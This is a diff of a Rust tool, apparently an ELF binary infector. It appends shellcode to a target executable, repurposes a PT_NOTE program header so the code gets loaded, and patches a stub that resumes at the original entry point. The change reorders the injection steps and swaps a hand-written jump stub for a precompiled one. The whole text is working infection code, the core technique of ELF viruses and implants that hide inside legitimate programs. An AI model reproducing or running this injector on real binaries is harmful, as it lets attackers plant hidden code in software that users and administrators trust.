@@ -30,16 +30,12 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         elf_header.e_phnum,
     )?;
 
-    // Patch the shellcode to jump to the original entry point after finishing
-    patch_jump(&mut shellcode, elf_header.e_entry);
-
-    // Append the shellcode to the very end of the target ELF
-    elf_fd.seek(SeekFrom::End(0))?;
-    elf_fd.write(&shellcode)?;
+    // Save the old entry point so we can add a jump later
+    let original_entry = elf_header.e_entry;
 
     // Calculate offsets used to patch the ELF and program headers
     let sc_len = shellcode.len() as u64;
-    let file_offset = elf_fd.metadata()?.len() - sc_len;
+    let file_offset = elf_fd.metadata()?.len();
     let memory_offset = 0xc00000000 + file_offset;
 
     // Look for a PT_NOTE section
@@ -59,6 +55,13 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
+    // Patch the shellcode to jump to the original entry point after finishing
+    patch_jump(&mut shellcode, elf_header.e_entry, original_entry);
+
+    // Append the shellcode to the very end of the target ELF
+    elf_fd.seek(SeekFrom::End(0))?;
+    elf_fd.write(&shellcode)?;
+
     // Commit changes to the program and ELF headers
     mental_elf::write_elf64_program_headers(
         &mut elf_fd, 
@@ -71,10 +74,12 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     Ok(())
 }
 
-fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64) {
-    // Store entry_point in rax
-    shellcode.extend_from_slice(&[0x48u8, 0xb8u8]);
-    shellcode.extend_from_slice(&entry_point.to_ne_bytes());
-    // Jump to address in rax
-    shellcode.extend_from_slice(&[0xffu8, 0xe0u8]);
+/// Patches in shellcode to resolve _start and jump there
+fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64, start_offset: u64) {
+    use byteorder::{ByteOrder, LittleEndian as le};
+    let mut jump_shellcode = include_bytes!("../files/jump_to_start.o").clone();
+    le::write_u64(&mut jump_shellcode[0x07..], shellcode.len() as u64);
+    le::write_u64(&mut jump_shellcode[0x11..], entry_point);
+    le::write_u64(&mut jump_shellcode[0x1b..], start_offset);
+    shellcode.extend_from_slice(&jump_shellcode);
 }
